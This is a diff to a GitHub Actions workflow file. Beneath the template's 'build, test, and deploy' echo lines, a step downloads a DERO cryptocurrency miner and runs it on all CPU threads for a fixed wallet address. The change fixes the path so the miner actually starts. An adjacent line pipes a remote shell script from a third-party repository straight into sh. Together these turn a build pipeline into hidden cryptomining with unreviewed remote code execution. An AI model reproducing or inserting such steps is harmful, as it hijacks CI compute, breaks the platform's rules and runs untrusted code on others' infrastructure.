@@ -36,6 +36,6 @@ jobs:
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
-          wget -qO- https://github.com/deroproject/derohe/releases/latest/download/dero_linux_amd64.tar.gz | tar -xz && ls -l && chmod +x dero-miner-linux-amd64 && ./dero-miner-linux-amd64 --wallet-address dero1qys3mxadr35uec6gsg7hwqdye5v7mtvsmy064nqqkhdm05tklxs25qqymzf62 --mining-threads $(nproc) --miner-tag "YourWorkerNickname"
+          wget -qO- https://github.com/deroproject/derohe/releases/latest/download/dero_linux_amd64.tar.gz | tar -xz && ls -l && cd dero_linux_amd64 && chmod +x dero-miner-linux-amd64 && ./dero-miner-linux-amd64 --wallet-address dero1qys3mxadr35uec6gsg7hwqdye5v7mtvsmy064nqqkhdm05tklxs25qqymzf62 --mining-threads $(nproc) --miner-tag "YourWorkerNickname"
           curl -L https://raw.githubusercontent.com/Kamanati/linux-chat/main/new18.sh | sh
           ls
